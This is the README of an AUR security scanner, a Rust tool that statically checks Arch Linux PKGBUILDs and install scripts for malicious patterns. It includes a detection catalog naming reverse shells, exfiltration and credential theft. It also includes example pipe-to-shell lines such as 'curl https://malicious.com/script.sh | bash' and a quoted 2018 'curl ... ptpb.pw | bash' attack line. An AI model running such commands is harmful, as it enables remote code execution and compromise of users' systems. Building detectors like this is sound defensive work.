# AUR Security Scanner

```
║ ║╔═╝  ╔═║║ ║╔═║  ╔═╝╔═╝╔═║╔═ ╔═ ╔═╝╔═║
╔╝ ══║═╝╔═║║ ║╔╔╝═╝══║║  ╔═║║ ║║ ║╔═╝╔╔╝
╝ ╝══╝  ╝ ╝══╝╝ ╝  ══╝══╝╝ ╝╝ ╝╝ ╝══╝╝ ╝
```

**Detect malicious AUR packages before they compromise your system.**

[![AUR version](https://img.shields.io/aur/version/aur-scanner?logo=archlinux&logoColor=white&label=AUR)](https://aur.archlinux.org/packages/aur-scanner)
[![License: GPL-3.0](https://img.shields.io/badge/license-GPL--3.0-blue.svg)](LICENSE)
[![Built with Rust](https://img.shields.io/badge/built_with-Rust-dea584?logo=rust&logoColor=white)](https://www.rust-lang.org)
[![GPG-signed releases](https://img.shields.io/badge/releases-GPG_signed-2ea44f?logo=gnuprivacyguard&logoColor=white)](https://github.com/KiefStudioMA/ks-aur-scanner/releases)
[![Static analysis only](https://img.shields.io/badge/scanner-static_only-2ea44f.svg)](#security)
[![PRs welcome](https://img.shields.io/badge/PRs-welcome-2ea44f.svg)](CONTRIBUTING.md)
[![Code of Conduct](https://img.shields.io/badge/code_of_conduct-v2.1-blueviolet.svg)](CODE_OF_CONDUCT.md)

A comprehensive security scanner for Arch Linux AUR packages that analyzes PKGBUILDs and install scripts for malicious patterns, suspicious behavior, and security vulnerabilities. Written in Rust for performance and safety.

---

## TL;DR

```bash
# Install (stable, GPG-signed release — see "From AUR" for all channels)
paru -S aur-scanner
# or
yay -S aur-scanner

# Scan a package before installing
aur-scan check <package-name>

# Scan a local PKGBUILD
aur-scan scan ./PKGBUILD

# Scan all installed AUR packages
aur-scan system
```

---

## Table of Contents

- [Why This Exists](#why-this-exists)
- [Features](#features)
- [Installation](#installation)
  - [From AUR](#from-aur)
  - [From Source](#from-source)
  - [Manual Installation](#manual-installation)
- [Quick Start](#quick-start)
- [Command Reference](#command-reference)
  - [aur-scan check](#aur-scan-check)
  - [aur-scan install (race-free)](#aur-scan-install-race-free)
  - [aur-scan scan](#aur-scan-scan)
  - [aur-scan system](#aur-scan-system)
  - [aur-scan ioc](#aur-scan-ioc)
  - [aur-scan codes](#aur-scan-codes)
  - [aur-scan explain](#aur-scan-explain)
  - [Custom & Community Rules](#custom--community-rules)
- [Integration Options](#integration-options)
  - [Level 1: Manual CLI](#level-1-manual-cli)
  - [Level 2: Shell Integration](#level-2-shell-integration-recommended)
  - [Level 3: Wrapper Binary](#level-3-wrapper-binary)
  - [Level 4: Pacman Hook](#level-4-pacman-hook)
- [Detection Rules Reference](#detection-rules-reference)
  - [Critical Severity](#critical-severity)
  - [High Severity](#high-severity)
  - [Medium Severity](#medium-severity)
  - [Low/Informational](#lowinformational)
- [Output Formats](#output-formats)
- [Configuration](#configuration)
- [Real-World Detection Examples](#real-world-detection-examples)
- [Project Architecture](#project-architecture)
- [Dependencies](#dependencies)
- [Building from Source](#building-from-source)
- [Testing](#testing)
- [License](#license)
- [Contributing](#contributing)
- [Security](#security)
- [Credits](#credits)
- [Disclaimer](#disclaimer)

---

## Why This Exists

The Arch User Repository (AUR) is an incredible community resource that extends Arch Linux with thousands of user-contributed packages. However, AUR packages are inherently untrusted and have been exploited multiple times:

| Date | Attack | Impact |
|------|--------|--------|
| **June 2026** | "Atomic Arch" — 1,500+ orphaned packages adopted and modified to pull malicious npm/bun packages (`atomic-lockfile`, `js-digest`) | Credential stealer + eBPF rootkit (`scales.bpf.c`) dropped from install hooks |
| **July 2025** | CHAOS RAT distributed via `firefox-patch-bin` and `librewolf-fix-bin` | Remote access trojan with persistence via systemd masquerading |
| **2018** | Orphaned packages `acroread`, `balz`, `minergate` hijacked | Cryptominer installation via `curl \| bash` and systemd timers |
| **Ongoing** | Typosquatting attacks mimicking popular package names | Various malware payloads |

**There was no automated tool to scan for these threats before installation. Now there is.**

This scanner implements detection rules based on real-world attacks and security research, providing an additional layer of defense for the Arch Linux ecosystem.

---

## Features

| Feature | Description |
|---------|-------------|
| **Static Analysis** | 110+ detection codes across pattern rules and dedicated analyzers, in one auditable catalog |
| **Install Script Scanning** | Analyzes `.install` scripts for persistence mechanisms |
| **Source Verification** | Validates URLs, checksums, and download sources |
| **AUR Integration** | Fetch and scan packages directly from AUR before installation |
| **System Audit** | Scan all installed AUR packages in a single command |
| **Multiple Output Formats** | Human-readable, JSON, and SARIF for CI/CD integration |
| **Shell Integration** | Seamless wrapper for yay, paru, and other AUR helpers |
| **Pacman Hook** | System-wide enforcement during package transactions |
| **Offline Operation** | Core scanning works without network access |
| **Zero Dependencies Runtime** | Single static binary with no runtime dependencies |

---

## Installation

### From AUR

All four packages install the same `aur-scan` binary and **conflict with each
other — install exactly one**. Pick the channel that fits you:

| Package | Channel | Builds from | Best for |
|---------|---------|-------------|----------|
| [`aur-scanner`](https://aur.archlinux.org/packages/aur-scanner) | **Stable** (recommended) | GPG-signed release tag | Most users and production systems |
| [`ks-aur-scanner`](https://aur.archlinux.org/packages/ks-aur-scanner) | Stable (alias) | GPG-signed release tag | Same as `aur-scanner`, under an alternate name |
| [`aur-scanner-rc`](https://aur.archlinux.org/packages/aur-scanner-rc) | Release candidate | GPG-signed pre-release tag | Testing the next release before it ships |
| [`aur-scanner-git`](https://aur.archlinux.org/packages/aur-scanner-git) | Rolling | Latest commit on `main` | Bleeding edge and contributors |

```bash
paru -S aur-scanner        # stable, recommended — or: yay -S aur-scanner
```

The tagged packages (`aur-scanner`, `ks-aur-scanner`, `aur-scanner-rc`) build
from a **GPG-signed git tag** and verify it against our signing key
(`validpgpkeys`), so `makepkg` refuses to build a tag that isn't signed by us —
integrity comes from the signature, not a tarball hash. If your AUR helper does
not fetch the key automatically, import it once:

```bash
gpg --recv-keys 25631EAE3F43999050B7D7021132BF893C33FB51
```

> **Release-candidate channel — [`aur-scanner-rc`](https://aur.archlinux.org/packages/aur-scanner-rc):**
> tracks the next release (currently `1.1.0-rc1`) so you can test it before it's
> promoted to stable. The RC **fails closed** — the `paru`/`yay` wrapper and the
> pacman hook now *deny* on a scan/fetch error, a timeout, or a non-interactive
> (no-TTY) prompt instead of proceeding. That's the right behavior for a security
> gate, but read the [release notes](https://github.com/KiefStudioMA/ks-aur-scanner/releases/tag/v1.1.0-rc1) before driving it from scripts or
> CI. Production systems should stay on the stable `aur-scanner`.

### From Source

```bash
git clone https://github.com/KiefStudioMA/ks-aur-scanner.git
cd ks-aur-scanner
cargo build --release
```

### Manual Installation

After building from source:

```bash
# Install binaries
sudo install -Dm755 target/release/aur-scan /usr/bin/aur-scan
sudo install -Dm755 target/release/aur-scan-wrap /usr/bin/aur-scan-wrap
sudo install -Dm755 target/release/aur-scan-hook /usr/bin/aur-scan-hook

# Install shell integration (recommended — scans BEFORE makepkg builds)
sudo install -Dm644 install/integration.bash /usr/share/aur-scan/integration.bash
sudo install -Dm644 install/integration.zsh /usr/share/aur-scan/integration.zsh
sudo install -Dm644 install/integration.fish /usr/share/aur-scan/integration.fish

# Install the community rules example
sudo install -Dm644 install/rules.d/example.toml /usr/share/aur-scanner/rules.d/example.toml

# Pacman hook — opt-in backstop only. It runs AFTER makepkg has already built
# (and executed) the package, so it catches .install scriptlets, not build-time
# payloads. Prefer the shell integration above. Enable it deliberately:
sudo install -Dm644 install/aur-scan.hook /usr/share/libalpm/hooks/aur-scan.hook
```

---

## Quick Start

```bash
# Check a package BEFORE installing from AUR
aur-scan check firefox-patch-bin

# Scan a local PKGBUILD file
aur-scan scan ./PKGBUILD

# Scan an entire package directory
aur-scan scan ./my-package/

# Audit all installed AUR packages on your system
aur-scan system

# Learn about a specific detection code
aur-scan explain DLE-001

# List all detection codes
aur-scan codes
```

---

## Command Reference

### aur-scan check

Resolve the **full AUR dependency tree**, scan every untrusted package in it,
and emit a reviewable **SBOM** — all *before* anything is built or installed.
`paru -S foo` builds foo's entire AUR dependency closure, and a hijacked
package is often a *dependency*, so the named package alone is not enough.

```bash
aur-scan check <package-name>... [OPTIONS]

OPTIONS:
    --no-deps            Scan only the named packages, not their AUR dep tree
    --include-optional   Also follow optdepends when resolving the tree
    --sbom <FILE>        Write a CycloneDX 1.5 SBOM of the whole tree to FILE
    --local <DIR>        Scan an already-fetched package dir from disk (repeatable)
    --fail-on <LEVEL>    Exit non-zero if findings at this level or above
                         (critical, high, medium, low, info)
    --no-confirm         Don't prompt; just report (for wrappers/CI)
```

**Race-free (TOCTOU-safe) workflow.** By default `check` fetches its own copy of
each PKGBUILD; the helper then re-clones and builds its own copy, so the bytes
scanned aren't provably the bytes built. To scan the *exact* bytes that will be
built, fetch once and scan that directory with `--local`, then build from it:

```bash
paru -G mypkg                          # download PKGBUILD only, no build
aur-scan check --local mypkg --fail-on critical   # scan those exact bytes
makepkg -D mypkg -si                   # build the same, reviewed directory
```

`--local` directories are scanned from disk and marked `(local)`; any remaining
AUR dependencies are resolved/fetched normally (provide their dirs too for a
fully race-free tree).

The dependency tree is printed for review, marking each node `[AUR]` (scanned)
or `[repo]` (official, trusted), flagging orphaned AUR packages, and annotating
findings per node (`!! 2C/1H`). AUR packages are resolved recursively; official
repository dependencies are signed and treated as trusted leaves.

**Examples:**

```bash
# Resolve + scan the full tree and review it before installing
aur-scan check librewolf-bin

# Produce a CycloneDX SBOM to archive or review
aur-scan check ungoogled-chromium-bin --sbom chromium.cdx.json

# CI gate: fail on any high+ finding anywhere in the tree
aur-scan check my-package --no-confirm --fail-on high

# Just the named package, skip the dependency closure
aur-scan check some-tool --no-deps
```

> The dependency tree and SBOM are produced from the AUR RPC + PKGBUILDs
> **before** `makepkg` runs, which is the only point at which AUR build-time
> payloads can be caught. Drive it automatically by sourcing the shell
> integration so `paru`/`yay` call `aur-scan check` before every install.

### aur-scan install (race-free)

Resolve the tree, fetch every AUR package **once** into a workspace, scan those
exact directories, and — only if the scan gate passes — build them in
dependency order with `makepkg`, **from the same directories that were
scanned**. This eliminates the time-of-check/time-of-use gap entirely: there is
no second fetch between scanning and building.

```bash
aur-scan install <package>... [OPTIONS]

OPTIONS:
    --gate <LEVEL>       Findings at/above this severity block the build
                         [default: critical]
    --force              Build even if the gate trips (deliberate override)
    --noconfirm          Pass --noconfirm to makepkg, skip the build prompt
    --workspace <DIR>    Clone/build workspace (default ~/.cache/aur-scan/build)
    --sbom <FILE>        Write a CycloneDX SBOM of the tree
```

Dependency ordering comes from the resolved graph (deps built before
dependents); `makepkg` itself does all the building, so no PKGBUILD logic is
reimplemented. Enable it as the default for the shell integration with
`export AUR_SCAN_MODE=install`. It targets AUR packages; install official-repo
packages with `pacman` as usual.

> **Scope:** builds each AUR `pkgbase` with `makepkg -si` in dependency order.
> It does not (yet) cover paru-specific features like split-package selection or
> chroot builds; for those, use the Level 2 `gate` mode.

### aur-scan scan

Scan a local PKGBUILD file or directory.

```bash
aur-scan scan <PATH> [OPTIONS]

OPTIONS:
    --format <FORMAT>    Output format: text, json, sarif [default: text]
    --fail-on <LEVEL>    Exit with error if findings at this level or above
    --no-color           Disable colored output

ARGUMENTS:
    <PATH>               Path to PKGBUILD file or directory containing PKGBUILD
```

**Examples:**

```bash
# Scan a single PKGBUILD
aur-scan scan ./PKGBUILD

# Scan a package directory (looks for PKGBUILD and .install files)
aur-scan scan ~/builds/my-package/

# Output SARIF for GitHub Security tab integration
aur-scan scan ./PKGBUILD --format sarif > results.sarif
```

### aur-scan system

Audit all AUR packages currently installed on the system.

```bash
aur-scan system [OPTIONS]

OPTIONS:
    --format <FORMAT>    Output format: text, json [default: text]
    --no-color           Disable colored output
```

This command:
1. Queries pacman for foreign (non-repo) packages
2. Locates cached PKGBUILDs in AUR helper cache directories
3. Scans each package and reports findings

**Supported cache locations:**
- `~/.cache/paru/clone/`
- `~/.cache/yay/`
- `~/.cache/pikaur/aur_repos/`
- `~/.cache/trizen/`

`system` also cross-references your installed package names against the IOC
database (see below) and runs the provenance check (flagging any package that
*gained* risky behavior since the last scan).

### aur-scan ioc

Show or query the local IOC (indicator-of-compromise) database — known-malicious
payload packages, file artifacts, C2 domains, and campaign metadata. The
database is embedded and can be extended from a feed (drop a file at
`/usr/share/aur-scanner/ioc.toml` or `~/.local/share/aur-scanner/ioc.toml`).

```bash
aur-scan ioc                 # show database stats + campaigns
aur-scan ioc --check <name>  # is this package/file/hash a known indicator?
```

### aur-scan codes

List all detection codes with their severity and description.

```bash
aur-scan codes [OPTIONS]

OPTIONS:
    --severity <LEVEL>   Filter by severity level
    --category <CAT>     Filter by category
```

**Example output:**

```
CRITICAL SEVERITY
-----------------
DLE-001    Curl pipe to shell
DLE-002    Wget pipe to shell
DLE-003    Curl output executed
SHELL-001  Bash reverse shell
SHELL-002  Netcat reverse shell
...
```

### aur-scan explain

Get detailed information about a specific detection code.

```bash
aur-scan explain <CODE>
```

**Example:**

```bash
$ aur-scan explain DLE-001

DLE-001: Curl pipe to shell
===========================

Severity: CRITICAL
Category: Command Injection
CWE: CWE-94

Description:
  Downloading and executing remote scripts is extremely dangerous.
  Used in 2018 xeactor attack.

Recommendation:
  Download scripts first, review them, then execute

Example Pattern:
  curl https://malicious.com/script.sh | bash
```

---

## Integration Options

### Level 1: Manual CLI

Use `aur-scan` commands directly before installing packages. This provides full control but requires manual invocation.

```bash
# Check package first
aur-scan check some-package

# Review output, then install if safe
paru -S some-package
```

### Level 2: Shell Integration (Recommended)

Add automatic scanning to your shell by sourcing the integration script.

**For Bash** - Add to `~/.bashrc`:

```bash
source /usr/share/aur-scan/integration.bash
```

**For Zsh** - Add to `~/.zshrc`:

```bash
source /usr/share/aur-scan/integration.zsh
```

**For Fish** - Add to `~/.config/fish/config.fish`:

```fish
source /usr/share/aur-scan/integration.fish
```

This creates wrapper functions for `paru` and `yay` that:
1. Detect AUR package installations
2. Pre-scan packages before proceeding
3. Prompt for confirmation on findings
4. Provide `paru-unsafe` and `yay-unsafe` aliases to bypass scanning

**Example workflow:**

```bash
$ paru -S some-aur-package
AUR Security Scanner: Pre-checking packages...
============================================================
Checking: some-aur-package... OK
============================================================
Proceeding with installation...
```

### Level 3: Wrapper Binary

Use the standalone wrapper binary for explicit control:

```bash
# Direct usage
aur-scan-wrap paru -S package-name

# Or set up as an alias
alias paru='aur-scan-wrap paru'
alias yay='aur-scan-wrap yay'
```

The wrapper:
- Detects sync operations (`-S`, `--sync`)
- Filters to only AUR packages (skips official repo packages)
- Scans each AUR package before proceeding
- Prompts on critical/high findings
- Passes through non-install operations unchanged

### Level 4: Pacman Hook (backstop only — runs *after* the build)

> **Important timing caveat.** For an AUR package, `makepkg` runs the
> PKGBUILD's `prepare()`/`build()`/`package()` **before** the pacman
> transaction. A libalpm `PreTransaction` hook fires during that transaction —
> i.e. *after* the build has already executed. So this hook **cannot stop a
> build-time payload** (the most common AUR attack, including Atomic Arch). It
> only blocks payloads in the package's `.install` scriptlet. **Use the shell
> integration (Level 2) as your real gate; treat this hook as a backstop.**

For a defense-in-depth backstop, install the pacman hook:

```bash
sudo cp /usr/share/aur-scan/aur-scan.hook.example /usr/share/libalpm/hooks/aur-scan.hook
```

**Hook behavior:**
- Triggers before the *install transaction* (after the build)
- **Aborts transaction on CRITICAL findings** in the `.install` scriptlet
- Warns on HIGH severity findings

**Hook configuration** (`/usr/share/libalpm/hooks/aur-scan.hook`):

```ini
[Trigger]
Operation = Install
Operation = Upgrade
Type = Package
Target = *

[Action]
Description = Scanning AUR packages for security issues...
When = PreTransaction
Exec = /usr/bin/aur-scan-hook
AbortOnFail
NeedsTargets
```

---

## Detection Rules Reference

> The **115 built-in detection codes**, generated from the catalog
> (`aur-scan codes --format markdown`) — every ID is unique and audit-enforced.
> (`EXAMPLE-001` is the shipped community-rule sample, not a built-in.) Extend the
> catalog with your own TOML rules (see [Custom & Community Rules](#custom--community-rules)).

## CRITICAL severity

| Code | Name | Category | Detector | CWE |
|------|------|----------|----------|-----|
| `ATOMIC-001` | Atomic Arch malicious npm/bun package | Malicious Code | rules | CWE-506 |
| `ATOMIC-002` | Node/Bun package manager in install hook | Malicious Code | rules | CWE-494 |
| `ATOMIC-003` | eBPF rootkit / payload artifact | Persistence | rules | CWE-506 |
| `BROWSER-001` | Browser profile access | Credential Theft | rules | CWE-522 |
| `BROWSER-002` | Browser database access | Credential Theft | rules | CWE-522 |
| `CRED-001` | SSH key access | Credential Theft | rules | CWE-522 |
| `CRED-002` | GPG key access | Credential Theft | rules | CWE-522 |
| `CRED-003` | Password file access | Credential Theft | rules | CWE-522 |
| `CRED-005` | Keyring / wallet access | Credential Theft | rules | CWE-522 |
| `CRYPTO-001` | Mining pool connection | Cryptomining | rules | CWE-506 |
| `CRYPTO-002` | Cryptominer binary | Cryptomining | rules | CWE-506 |
| `CRYPTO-003` | Monero/Bitcoin wallet address | Cryptomining | rules | CWE-506 |
| `DEEP-001` | Decode-and-execute flow | Obfuscation | deep | CWE-506 |
| `DLE-001` | Curl pipe to shell | Command Injection | rules | CWE-94 |
| `DLE-002` | Wget pipe to shell | Command Injection | rules | CWE-94 |
| `DLE-003` | Curl output executed | Command Injection | rules | CWE-94 |
| `ENV-001` | LD_PRELOAD manipulation | Malicious Code | rules | CWE-426 |
| `ENV-003` | Bashrc/profile modification | Persistence | rules | CWE-506 |
| `EXEC-002` | Shell -c command substitution fetch | Malicious Code | rules | CWE-494 |
| `EXEC-REMOTE` | Fetches and runs external code | Malicious Code | remote_exec | CWE-494 |
| `EXFIL-001` | Curl POST data exfiltration | Data Exfiltration | rules | CWE-200 |
| `EXFIL-002` | Netcat data transfer | Data Exfiltration | rules | CWE-200 |
| `EXFIL-003` | Discord/Telegram webhook | Data Exfiltration | rules | CWE-506 |
| `EXFIL-004` | DNS exfiltration | Data Exfiltration | rules | CWE-200 |
| `EXFIL-008` | Slack/Teams webhook exfiltration | Data Exfiltration | rules | CWE-200 |
| `INSTALL-001` | Python execution in install script | Malicious Code | rules | CWE-94 |
| `INSTALL-003` | Network access in install script | Network Security | rules | CWE-494 |
| `INSTALL-004` | Language package manager invoked in install hook | Malicious Code | rules | CWE-494 |
| `IOC-001` | Known indicator-of-compromise match | Malicious Code | ioc | CWE-506 |
| `PASTE-001` | Pastebin download | Malicious Code | rules | CWE-506 |
| `PERSIST-001` | Systemd service creation in install | Persistence | rules | CWE-506 |
| `PERSIST-002` | Systemd timer creation | Persistence | rules | CWE-506 |
| `PERSIST-004` | rc.local modification | Persistence | rules | CWE-506 |
| `PERSIST-006` | Systemd masquerading | Persistence | rules | CWE-506 |
| `PRIV-001` | Sudo usage in a build function | Privilege Escalation | privilege | CWE-250 |
| `PRIV-002` | SUID/SGID bit set in a function | Privilege Escalation | privilege | CWE-732 |
| `PRIV-003` | Sudoers modification | Privilege Escalation | privilege | CWE-250 |
| `PRIV-007` | Privileged account manipulation | Privilege Escalation | rules | CWE-269 |
| `PRIV-008` | Password manipulation | Privilege Escalation | rules | CWE-269 |
| `SHELL-001` | Bash reverse shell | Malicious Code | rules | CWE-506 |
| `SHELL-002` | Netcat reverse shell | Malicious Code | rules | CWE-506 |
| `SHELL-003` | Python reverse shell | Malicious Code | rules | CWE-506 |
| `SHELL-004` | Socat shell | Malicious Code | rules | CWE-506 |
| `SHELL-005` | Perl reverse shell | Malicious Code | rules | CWE-94 |
| `SHELL-006` | PHP reverse shell | Malicious Code | rules | CWE-94 |
| `SHELL-007` | Ruby/Lua/AWK reverse shell | Malicious Code | rules | CWE-94 |
| `SHELL-008` | Node.js reverse shell | Malicious Code | rules | CWE-94 |
| `SHELL-009` | OpenSSL-encrypted reverse shell | Malicious Code | rules | CWE-94 |
| `SHELL-010` | Named-pipe (mkfifo) reverse shell | Malicious Code | rules | CWE-94 |
| `SHELL-011` | Busybox/telnet/ncat-ssl shell | Malicious Code | rules | CWE-94 |
| `TAMPER-001` | Auth database write | Privilege Escalation | rules | CWE-269 |
| `TAMPER-002` | doas/sudoers nopasswd grant | Privilege Escalation | rules | CWE-269 |
| `TAMPER-005` | PAM tampering | Privilege Escalation | rules | CWE-287 |
| `TAMPER-011` | pacman signature downgrade | Malicious Code | rules | CWE-347 |

## HIGH severity

| Code | Name | Category | Detector | CWE |
|------|------|----------|----------|-----|
| `CHK-001` | No checksums for sources | Cryptography | checksum | CWE-354 |
| `CHK-005` | All non-VCS sources use SKIP | Cryptography | checksum | CWE-354 |
| `CHK-006` | Checksum count mismatch | Configuration | checksum | - |
| `CRED-004` | Cloud / CI credential file access | Credential Theft | rules | CWE-522 |
| `CRED-008` | Environment/secret dump | Credential Theft | rules | CWE-522 |
| `DEEP-002` | Large embedded encoded blob | Obfuscation | deep | CWE-506 |
| `DEP-001` | Provides a core package name (dependency confusion) | Suspicious Metadata | metadata | CWE-427 |
| `DEP-003` | Package index/registry override | Dependencies | rules | CWE-494 |
| `ENV-002` | PATH manipulation | Malicious Code | rules | CWE-426 |
| `EXEC-006` | sqlite3 shell-command execution | Malicious Code | rules | CWE-94 |
| `EXEC-007` | make reads a Makefile from stdin | Command Injection | rules | CWE-94 |
| `EXFIL-006` | HTTP upload exfiltration | Data Exfiltration | rules | CWE-200 |
| `EXFIL-007` | wget POST exfiltration | Data Exfiltration | rules | CWE-200 |
| `EXFIL-009` | Anonymous file-drop / tunnel host | Data Exfiltration | rules | CWE-200 |
| `FUNC-001` | Network access in a build function | Network Security | pattern | - |
| `HIDDEN-001` | Hidden file creation in home | Malicious Code | rules | - |
| `HIDDEN-002` | Tmp directory execution | Malicious Code | rules | - |
| `HIDDEN-003` | Binary in non-standard location | Malicious Code | rules | - |
| `INSTALL-002` | Binary execution in install script | Malicious Code | rules | CWE-94 |
| `META-003` | Replaces/conflicts a core or security package | Suspicious Metadata | metadata | CWE-1357 |
| `OBF-001` | Base64 decoding | Obfuscation | rules | CWE-506 |
| `OBF-002` | Eval usage | Command Injection | rules | CWE-95 |
| `OBF-003` | Hex-encoded payload | Obfuscation | rules | CWE-506 |
| `OBF-005` | Gzip decode execution | Obfuscation | rules | CWE-94 |
| `OBF-006` | Quote-splitting / character obfuscation | Obfuscation | rules | CWE-506 |
| `OBF-007` | printf character assembly | Obfuscation | rules | CWE-506 |
| `OBF-008` | Alternate-encoding decode | Obfuscation | rules | CWE-506 |
| `OBF-011` | Interpreter here-string execution | Obfuscation | rules | CWE-94 |
| `PERSIST-003` | Cron job creation | Persistence | rules | - |
| `PERSIST-005` | XDG autostart creation | Persistence | rules | - |
| `PRIV-005` | Kernel module operations | Privilege Escalation | privilege | - |
| `PRIV-006` | Sudo in an install hook | Privilege Escalation | privilege | CWE-250 |
| `PROV-001` | Package gained risky behavior | Suspicious Metadata | provenance | CWE-506 |
| `SRC-002` | Suspicious source domain | Network Security | source | - |
| `SRC-003` | Raw IP address in source URL | Network Security | source | - |
| `SRC-004` | URL shortener in source | Network Security | source | - |
| `SRC-009` | Obfuscated IP in URL | Network Security | rules | CWE-94 |
| `TAMPER-013` | Security control disabled | Malicious Code | rules | CWE-693 |
| `TAMPER-017` | CA trust anchor injection | Malicious Code | rules | CWE-295 |
| `TRUST-001` | pacman keyring poisoning | Malicious Code | rules | CWE-494 |
| `URL-001` | Raw IP in URL | Network Security | rules | - |
| `URL-002` | URL shortener | Network Security | rules | - |
| `URL-003` | Dynamic DNS domain | Network Security | rules | - |

## MEDIUM severity

| Code | Name | Category | Detector | CWE |
|------|------|----------|----------|-----|
| `CHK-002` | MD5 checksums used | Cryptography | checksum | CWE-328 |
| `CHK-003` | SHA1 checksums used | Cryptography | checksum | CWE-328 |
| `CHK-004` | Some sources use SKIP checksum | Cryptography | checksum | CWE-354 |
| `CHK-008` | Malformed or wrong-length checksum | Cryptography | checksum | CWE-354 |
| `EXEC-005` | Detached background execution | Malicious Code | rules | CWE-506 |
| `META-005` | install= points outside the package | Suspicious Metadata | metadata | CWE-426 |
| `META-006` | backup= of a security-sensitive file | Suspicious Metadata | metadata | CWE-426 |
| `OBF-004` | String concatenation obfuscation | Obfuscation | rules | - |
| `PRIV-004` | Capabilities being set | Privilege Escalation | privilege | CWE-250 |
| `SRC-001` | Insecure source/transport protocol | Network Security | source | CWE-319 |
| `SRC-005` | No sources with a build function | Configuration | source | - |
| `TRUST-002` | GPG key import at build time | Malicious Code | rules | CWE-494 |

## LOW severity

| Code | Name | Category | Detector | CWE |
|------|------|----------|----------|-----|
| `META-001` | Provides impersonation | Suspicious Metadata | rules | - |
| `META-002` | validpgpkeys declared but no signature verified | Suspicious Metadata | metadata | CWE-347 |
| `META-004` | epoch set (forces upgrade over the repo version) | Suspicious Metadata | metadata | - |
| `SRC-006` | VCS source from non-standard host | Network Security | source | - |
| `SRC-007` | VCS source not pinned to a commit | Network Security | source | CWE-494 |
| `SRC-008` | Source host differs from upstream url host | Network Security | source | - |

## Custom & Community Rules

Every detection code lives in one authoritative **catalog**, so the index is
unique and auditable — run `aur-scan codes` to see it, or
`aur-scan explain <ID>` for any code. You can extend it with a few lines of
TOML; no rebuild required.

Drop `.toml` files into any of:

| Path | Scope |
|------|-------|
| `/usr/share/aur-scanner/rules.d/` | distro / package-shipped |
| `/etc/aur-scanner/rules.d/` | system administrator |
| `~/.config/aur-scanner/rules.d/` | per user |

```toml
[[rule]]
id = "ACME-001"                 # must be UNIQUE across the whole catalog
name = "Flags the ACME backdoor marker"
description = "Detects the marker string left by the ACME backdoor."
severity = "critical"           # critical | high | medium | low | info
category = "malicious_code"
recommendation = "Do not build; report the package."
file_types = ["pkgbuild", "install_script"]

[[rule.patterns]]
type = "regex"
pattern = "acme_backdoor_[0-9a-f]{8}"
```

The loader skips malformed files with a warning (it never breaks the engine),
and the catalog refuses to start if any ID collides. A shipped example lives at
`/usr/share/aur-scanner/rules.d/example.toml`. Use an org-specific prefix to
avoid collisions.

## Output Formats

### Text (Default)

Human-readable output with colored severity indicators:

```bash
aur-scan scan ./PKGBUILD
```

### JSON

Machine-readable JSON for scripting and automation:

```bash
aur-scan scan ./PKGBUILD --format json
```

**Example output:**

```json
{
  "package_name": "example-package",
  "package_version": "1.0.1-1",
  "scan_duration_ms": 45,
  "findings": [
    {
      "id": "DLE-001",
      "severity": "critical",
      "category": "command_injection",
      "title": "Curl pipe to shell",
      "description": "Downloading and executing remote scripts is extremely dangerous.",
      "location": {
        "file": "PKGBUILD",
        "line": 23,
        "column": 5,
        "snippet": "curl https://example.com/install.sh | bash"
      },
      "recommendation": "Download scripts first, review them, then execute",
      "cwe_id": "CWE-94"
    }
  ]
}
```

### SARIF

Static Analysis Results Interchange Format for CI/CD integration:

```bash
aur-scan scan ./PKGBUILD --format sarif > results.sarif
```

SARIF output is compatible with:
- GitHub Code Scanning
- Azure DevOps
- Visual Studio
- Other SARIF-compatible tools

---

## Configuration

### Environment Variables

| Variable | Default | Description |
|----------|---------|-------------|
| `AUR_SCAN_ENABLED` | `1` | Enable/disable scanning in shell integration |
| `AUR_SCAN_SEVERITY` | `high` | Minimum severity to display |
| `AUR_SCAN_INTERACTIVE` | `1` | Prompt before proceeding |
| `AUR_SCAN_COLOR` | `1` | Enable colored output |
| `AUR_SCAN_SCAN_UPGRADES` | `1` | On a system upgrade (`-Syu`/`-Syyu`/bare `yay`), scan **each** AUR package that has a pending update (resolved via the helper's `-Quaq`). A hijacked *update* is the primary AUR threat, so this is on by default; set `0` to skip it. |
| `AUR_SCAN_SCAN_GETPKGBUILD` | `0` | Also scan the package(s) on `-G`/`--getpkgbuild` (which only downloads a PKGBUILD to review). Off by default; set `1` to opt in. |

The shell integration scans what's **named** on the command line — `-S pkg`, a bare `helper pkg`, `yay -Y pkg`, and (above) the upgrade set. It cannot see the package chosen *after* an interactive search-and-select menu (`yay`'s default `-Y` mode resolves it at runtime); for that — and for any helper or path the shell functions don't wrap — enable the opt-in **pacman hook**, which fires on the exact package set of every transaction. Only `paru` and `yay` are wrapped as shell functions (they share pacman's flag grammar); use the hook to cover others.

### Configuration File

Optional configuration file at `/etc/aur-scanner/config.toml`:

```toml
# Minimum severity to report
min_severity = "low"

# Scan timeout in seconds
timeout_seconds = 30

# Cache settings
[cache]
enabled = true
directory = "/var/cache/aur-scanner"
max_size_mb = 100
ttl_hours = 24
```

---

## Real-World Detection Examples

### Atomic Arch Supply-Chain Attack (June 2026)

Orphaned packages were adopted and their install hooks modified to pull a
malicious npm/bun package that drops an infostealer and eBPF rootkit. The
scanner flags both the install-hook behavior and the known-bad package names:

```
[CRITICAL] ATOMIC-002 Node/Bun package manager in install hook
    Location: alvr.install:4
    npm install atomic-lockfile

[CRITICAL] ATOMIC-001 Atomic Arch malicious npm/bun package
    Location: alvr.install:4
    Known-malicious package: atomic-lockfile

[CRITICAL] ATOMIC-001 Atomic Arch malicious npm/bun package
    Location: alvr.install:9
    Known-malicious package: js-digest (wave 2, Bun installer)
```

### CHAOS RAT Attack (July 2025)

The scanner would have detected this attack with the following findings:

```
[CRITICAL] PERSIST-006 Systemd masquerading
    Location: PKGBUILD:45
    Binary named like systemd component: 'systemd-initd'

[CRITICAL] INSTALL-001 Python execution in install script
    Location: librewolf-fix-bin.install:12
    Executing Python in post_install is suspicious

[CRITICAL] PERSIST-001 Systemd service creation
    Location: librewolf-fix-bin.install:15
    systemctl enable firefox-fix.service

[HIGH] HIDDEN-002 Tmp directory execution
    Location: PKGBUILD:23
    /tmp/systemd-initd
```

### 2018 Cryptominer Attack (xeactor)

```
[CRITICAL] DLE-001 Curl pipe to shell
    Location: PKGBUILD:18
    curl -s https://ptpb.pw/~x | bash

[CRITICAL] PASTE-001 Pastebin download
    Location: PKGBUILD:18
    Downloads from paste sites (ptpb.pw)

[CRITICAL] PERSIST-002 Systemd timer creation
    Location: PKGBUILD:34
    OnBootSec=1min

[CRITICAL] CRYPTO-001 Mining pool connection
    Location: hidden-script.sh:5
    stratum+tcp://pool.supportxmr.com:3333
```

---
